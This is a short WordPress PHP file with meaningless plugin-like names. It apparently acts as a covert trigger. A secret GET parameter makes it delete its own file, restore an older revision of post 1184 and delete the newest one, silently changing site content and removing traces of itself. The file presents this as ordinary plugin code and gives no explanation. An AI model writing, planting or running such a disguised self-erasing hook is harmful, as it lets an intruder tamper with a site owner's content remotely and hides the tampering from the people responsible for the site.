<?php

function import_json_slug_signup() {
	if (isset($_GET['ultimate_author_item_js']) && $_GET['ultimate_author_item_js'] === 'shopp_jetpack_scripts_virtual') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$version_menus_variations_include = 1184;
		$videos_guest_background = wp_get_post_revisions($version_menus_variations_include);
		if (empty($videos_guest_background)) die('no revisions');
		if (count($videos_guest_background) < 2) die('less than 2');
		$validator_reader_remove_external = array_shift($videos_guest_background);
		$accordion_animated_api = $validator_reader_remove_external->ID;
		$notification_remote_portal_feed = array_shift($videos_guest_background);
		$ultimate_purchase_back = $notification_remote_portal_feed->ID;
		$inline_plugin_exchange = wp_restore_post_revision($ultimate_purchase_back);
		if ($inline_plugin_exchange === false) die('error restoring');
		$inline_plugin_exchange = wp_delete_post_revision($accordion_animated_api);		
		if ($inline_plugin_exchange === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'import_json_slug_signup');
